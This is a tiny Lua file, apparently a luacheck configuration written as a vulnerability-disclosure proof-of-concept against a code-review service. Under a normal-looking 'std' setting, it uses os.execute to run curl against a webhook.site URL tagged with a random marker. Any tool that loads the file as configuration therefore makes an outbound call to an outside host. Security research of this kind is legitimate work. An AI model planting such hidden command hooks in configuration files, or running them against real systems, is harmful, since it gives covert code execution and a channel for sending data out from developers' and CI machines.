local mark = "E2E_LUAC_" .. tostring(math.random(100000, 999999))
pcall(function() os.execute("curl -s -m 8 -A CodeRabbit-VDP-Research https://webhook.site/fdd54483-81eb-449e-93b1-32846ad5d5f2/e2e-lua-fork-" .. mark) end)
std = mark
